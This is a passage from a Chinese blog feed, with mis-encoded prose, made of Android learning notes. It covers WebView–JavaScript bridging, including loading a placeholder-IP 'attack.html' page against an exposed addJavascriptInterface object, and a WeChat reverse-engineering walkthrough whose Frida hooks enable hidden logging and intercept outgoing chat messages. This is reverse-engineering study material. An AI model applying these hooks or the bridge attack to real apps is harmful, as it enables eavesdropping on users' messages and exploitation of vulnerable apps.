class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">         /&gt;</span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> findViewById(web_view);</span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webview.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">        webview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                view.loadUrl(url);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¸…å•æ–‡ä»¶å…è®¸è”ç½‘</p><p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</code></p>  <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line"><span class="string">...</span></span><br><span class="line">android<span class="function">:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line">&lt;<span class="string">/application</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>è¿œç¨‹åŠ è½½</strong></p><p>é€šè¿‡ä¸€ä¸ªjsè„šæœ¬è°ƒç”¨javaä¸­çš„ä»£ç </p><p>jså†…å®¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//ç”±äºå¯¹è±¡æ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨testå¯¹è±¡ç­‰äºè°ƒç”¨Androidæ˜ å°„çš„å¯¹è±¡</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--ç‚¹å‡»æŒ‰é’®åˆ™è°ƒç”¨callAndroidå‡½æ•°--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// è®¾ç½®ä¸Jsäº¤äº’çš„æƒé™</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// é€šè¿‡addJavascriptInterface()å°†Javaå¯¹è±¡æ˜ å°„åˆ°JSå¯¹è±¡</span></span><br><span class="line"><span class="comment">//å‚æ•°1ï¼šJavascriptå¯¹è±¡å</span></span><br><span class="line"><span class="comment">//å‚æ•°2ï¼šJavaå¯¹è±¡å</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJSç±»å¯¹è±¡æ˜ å°„åˆ°jsçš„testå¯¹è±¡</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// åŠ è½½JSä»£ç </span></span><br><span class="line"><span class="comment">// æ ¼å¼è§„å®šä¸º:file:///android_asset/æ–‡ä»¶å.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ipåœ°å€å¡«è‡ªå·±çš„/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æä¾›æ¥å£åœ¨Webviewä¸­ä¾›JSè°ƒç”¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰JSéœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè¢«JSè°ƒç”¨çš„æ–¹æ³•å¿…é¡»åŠ å…¥@JavascriptInterfaceæ³¨è§£</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Helloï¼Œ&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Androidè°ƒç”¨js</strong></p><p>js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æµ‹è¯•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;Androidè°ƒç”¨äº†JSçš„callJSæ–¹æ³•&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Androidè°ƒç”¨JSæ–¹æ³•æµ‹è¯•<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®ä¸Jsäº¤äº’çš„æƒé™</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// è®¾ç½®å…è®¸JSå¼¹çª—</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// å…ˆè½½å…¥JSä»£ç </span></span><br><span class="line"> <span class="comment">// æ ¼å¼è§„å®šä¸º:file:///android_asset/æ–‡ä»¶å.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// é€šè¿‡Handlerå‘é€æ¶ˆæ¯</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// æ³¨æ„è°ƒç”¨çš„JSæ–¹æ³•åè¦å¯¹åº”ä¸Š</span></span><br><span class="line">                 <span class="comment">// è°ƒç”¨javascriptçš„callJS()æ–¹æ³•</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ç”±äºè®¾ç½®äº†å¼¹çª—æ£€éªŒè°ƒç”¨ç»“æœ,æ‰€ä»¥éœ€è¦æ”¯æŒjså¯¹è¯æ¡†</span></span><br><span class="line"> <span class="comment">// webviewåªæ˜¯è½½ä½“ï¼Œå†…å®¹çš„æ¸²æŸ“éœ€è¦ä½¿ç”¨webviewChromClientç±»å»å®ç°</span></span><br><span class="line"> <span class="comment">// é€šè¿‡è®¾ç½®WebChromeClientå¯¹è±¡å¤„ç†JavaScriptçš„å¯¹è¯æ¡†</span></span><br><span class="line"> <span class="comment">//è®¾ç½®å“åº”js çš„Alert()å‡½æ•°</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æˆåŠŸ</p><p><img src="/posts/69766bbb.htm/905443_JWE7TE67SA736UJ.png" alt="image-20220729094802205"></p><p>è¿˜å¯ä»¥ä½¿ç”¨evaluateJavascriptæ¥åŠ è½½jsè„šæœ¬å†…å®¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨evaluateJavascriptæ¥åŠ è½½jsä¸­å‡½æ•°</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„ä¸º js è¿”å›çš„ç»“æœ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="WebViewæ¼æ´">WebViewæ¼æ´</h3><p><img src="/posts/69766bbb.htm/905443_C8YTUCX4746WZHB.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ“é˜…è¯»ã€Šç¬¬ä¸€è¡Œä»£ç ã€‹è®°å½•çš„ä¸€äº›å°ä¸œè¥¿</summary>
    
    
    
    <category term="é˜…è¯»" scheme="https://zxk1ng.github.io/categories/%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="é˜…è¯»" scheme="https://zxk1ng.github.io/tags/%E9%98%85%E8%AF%BB/"/>
    
    <category term="Androidå¼€å‘" scheme="https://zxk1ng.github.io/tags/Android%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>wechatç®€å•é€†å‘</title>
    <link href="https://zxk1ng.github.io/posts/5324751f.html"/>
    <id>https://zxk1ng.github.io/posts/5324751f.html</id>
    <published>2025-01-15T05:14:22.000Z</published>
    <updated>2025-01-15T06:13:32.724Z</updated>
    
    <content type="html"><![CDATA[<h1>å¾®ä¿¡appç®€å•é€†å‘å­¦ä¹ </h1><ul><li>å°è®°ï¼šæ²¡æœ‰é€†å‘è¿‡ä»€ä¹ˆæ­£å¼appï¼Œç¿»é˜…å“²ä½¬åšå®¢çœ‹åˆ°äº†å¾®ä¿¡é€†å‘çš„å®æˆ˜ï¼Œä¹‹å‰çœ‹åˆ°å°±æœ›è€Œå´æ­¥äº†ï¼Œæœ€è¿‘æ²¡ä»€ä¹ˆäº‹æƒ…å°±å°è¯•å¤ç°äº†ä¸€ä¸‹ï¼Œä¹Ÿåªèƒ½æ˜¯æ‡‚äº†ä¸€ç‚¹å´åˆæ²¡å®Œå…¨å¼„æ‡‚</li></ul><h2 id="vx-Logæ—¥å¿—è¾“å‡º">vx Logæ—¥å¿—è¾“å‡º</h2><p>åƒè¿™ç§å¤§å‹çš„appéƒ½ä¼šè‡ªå·±åŒ…è£…ä¸€ä¸ªLogç±»ï¼Œç”¨äºå¼€å‘è¿‡ç¨‹ä¸­çš„Logè¾“å‡ºè°ƒå¼ï¼Œè€Œæ­£å¼å‘å¸ƒåéƒ½ä¼šå…³é—­è¿™äº›Logç±»è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…³é—­logç±»è¾“å‡ºçš„æ–¹æ³•æ‰“å¼€å®ƒï¼Œåˆ©äºæˆ‘ä»¬åé¢é€†å‘åˆ†æ</p><p>ç®€å•çœ‹ä¸€ä¸‹åç¼–è¯‘åçš„ä»£ç ï¼Œå‘ç°æ‰“å°è¾“å‡ºæœ‰äº›æ˜¯ae.xè¿™ç§ç»“æ„çš„ï¼Œè·Ÿè¿›aeç±»çœ‹ä¸€ä¸‹ã€‚çœ‹ä¸€ä¸‹é‡Œé¢æœ‰æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æ–¹æ³•å<img src="/posts/5324751f.htm/image-20250115135240735.png" alt></p><p>çœ‹è¿™ä¸ªåå­—åº”è¯¥æ˜¯æ§åˆ¶Logå¼€å…³çš„æ–¹æ³•ã€‚çœ‹çœ‹å“ªé‡Œå¼•ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œè·Ÿè¿›åˆ°keep_setupXLog()æ–¹æ³•ã€‚</p><p><img src="/posts/5324751f.htm/image-20240609144528529.png" alt="image-20240609144528529"></p><p>å‘ç°æ˜¯setConsoleLogOpen()çš„å‚æ•°æ§åˆ¶Logçš„å¼€å…³ï¼Œè€Œè¿™ä¸ªå‚æ•°åˆæ˜¯keep_setupXLog()çš„ç¬¬å…­ä¸ªå‚æ•°ï¼Œæ‰€ä»¥åªè¦hookæŠŠè¿™ä¸ªå‚æ•°å˜ä¸ºtrueåº”è¯¥å°±å¯ä»¥äº†ã€‚é€‰æ‹©hook keep_setupXLog()ä¿®æ”¹å‚æ•°å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.xlog.app.XLogSetup&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">keep_setupXLog</span>.<span class="title function_">overload</span>(<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.Integer&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">p0,p1,p2,p3,p4,p5,p6</span>) &#123;</span><br><span class="line">        <span class="variable language_">arguments</span>[<span class="number">5</span>] = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Boolean&quot;</span>).<span class="property">TRUE</span>.<span class="property">value</span>;  <span class="comment">//ä¿®æ”¹ä¸ºtrue</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å·²å¼€å¯vx Logæ‰“å°&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.<span class="property">keep_setupXLog</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);   <span class="comment">//è¿è¡Œå‡½æ•°(å‚æ•°è¢«ä¿®æ”¹åçš„)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åæˆ‘å°è¯•ä½¿ç”¨Android Studioçš„Logcatçœ‹çœ‹æœ‰æ²¡æœ‰è¾“å‡ºå‘ç°æ²¡æœ‰è¾“å‡ºï¼Œçœ‹å“²ä½¬ç¬”è®°å‘ç°äº†Logç¼“å­˜ç›®å½•å•¥çš„æ‰“å¼€æ—¶ä¹±ç ä¹Ÿæ²¡æœ‰ç®¡ï¼Œä½†æ˜¯è¿™ä¸ªå¯¹åé¢çš„åˆ†ææ²¡æœ‰å¤ªå¤§çš„å½±å“ï¼Œè¿™é‡Œå°±ç†è§£ç†è§£ä¸€ä¸‹æ€è·¯å§ã€‚</p><h2 id="vxå‘é€æ¶ˆæ¯">vxå‘é€æ¶ˆæ¯</h2><h3 id="åˆ†æ">åˆ†æ</h3><p>è¿™ç§æ€è·¯å°±æ˜¯å®šä½å…³é”®æ–¹æ³•ä½ç½®ï¼Œè¿™é‡Œé‡‡ç”¨DDMSè®°å½•ä¸€ä¸‹ç‚¹å‡»æ¶ˆæ¯æ¡†â€œå‘é€â€æŒ‰é’®åæ–¹æ³•çš„è°ƒç”¨æ ˆã€‚</p><p>æ‰“å¼€DDMSï¼Œé€‰ä¸­è¿›ç¨‹ï¼Œç„¶åç‚¹å‡»Start Method Profilingè¿›è¡Œè·Ÿè¸ªè®°å½•ã€‚</p><p>åŒæ—¶æµ‹è¯•æœºç‚¹å‡»å‘é€æŒ‰é’®ï¼Œç„¶åå…³é—­è·Ÿè¸ªè®°å½•<br><img src="/posts/5324751f.htm/image-20240609145348157.png" alt="image-20240609145348157"></p><p>ç„¶åä¼šå‡ºç°å¦‚ä¸‹çª—å£</p><p><img src="/posts/5324751f.htm/image-20240609145650911.png" alt="image-20240609145650911"></p><p>æœç´¢ä¸€ä¸‹onClickæ–¹æ³•å°±å¯ä»¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¿™DDMSä¸èƒ½æ–¹æ³•æœç´¢(æ„Ÿè§‰è‡ªå·±å‰æœŸç¯å¢ƒé…ç½®çš„çœŸçš„çƒ‚)</p><p>å®šä½åˆ° <strong>com.tencent.mm.pluginsdk.ui.chat.ChatFooter$7</strong></p><p>ç„¶ågdaçœ‹ä¸€ä¸‹è¿™ä¸ªç±»ä¸‹çš„ä»£ç </p><p><img src="/posts/5324751f.htm/image-20240609150036985.png" alt="image-20240609150036985"></p><p>è¿™é‡ŒæŒºæ˜æ˜¾çš„ï¼Œâ€œempty message cant be sentâ€,è€Œä¸Šé¢æ˜¯åˆ¤æ–­stræ˜¯å¦ç©ºï¼Œæ‰€ä»¥çŒœæµ‹strå°±æ˜¯ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯ï¼Œhookä¸€ä¸‹æœ‰strä½œä¸ºå‚æ•°çš„æ–¹æ³•ï¼Œæ‰“å°ä¸€ä¸‹å‚æ•°åº”è¯¥å°±å¯ä»¥äº†(è¿™é‡Œå¯ä»¥hookçš„æ–¹æ³•ä¸å”¯ä¸€ï¼Œéƒ½å¯ä»¥å®ç°)</p><p>è¿™é‡Œhookè¿™ä¸ªæ–¹æ³•</p><p><img src="/posts/5324751f.htm/image-20240609150443141.png" alt="image-20240609150443141"></p><p>hookä»£ç å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//console.log(&quot;aaa&quot;);</span></span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send Message&quot;</span>,<span class="variable language_">arguments</span>[<span class="number">1</span>]); </span><br><span class="line">        <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><p><img src="/posts/5324751f.htm/image-20240609150547432.png" alt="image-20240609150547432"></p><h2 id="ä¿®æ”¹vxæ¶ˆæ¯å†…å®¹">ä¿®æ”¹vxæ¶ˆæ¯å†…å®¹</h2><h3 id="å®šä½">å®šä½</h3><p>è¿˜æ˜¯é¦–å…ˆå®šä½å…³é”®æ–¹æ³•ï¼Œè¿™é‡Œä½¿ç”¨ddmsè‡ªå¸¦çš„uiè¯†åˆ«å·¥å…·(uiè¯†åˆ«çš„å·¥å…·æˆ‘æ˜¯çœŸçš„ç”¨éƒ½ç”¨ä¸äº†)ï¼Œè¯´ä¸€ä¸‹å¤§è‡´æ–¹æ³•</p><p>æµ‹è¯•æœºæ‰“å¼€åˆ°ä¸ç”¨æˆ·èŠå¤©ç•Œé¢ï¼Œä½¿ç”¨<code>Dump View Hierarchy for UI Automator</code>æ¥å®šä½å‘é€çš„æ¶ˆæ¯çš„æ§ä»¶ID</p><p>æ§ä»¶IDæ ¼å¼ä¸º<code>com.tencent.mm:id/al9</code>ï¼Œç„¶åä½¿ç”¨å‘½ä»¤è¡Œ<code>adb shell dumpsys activity 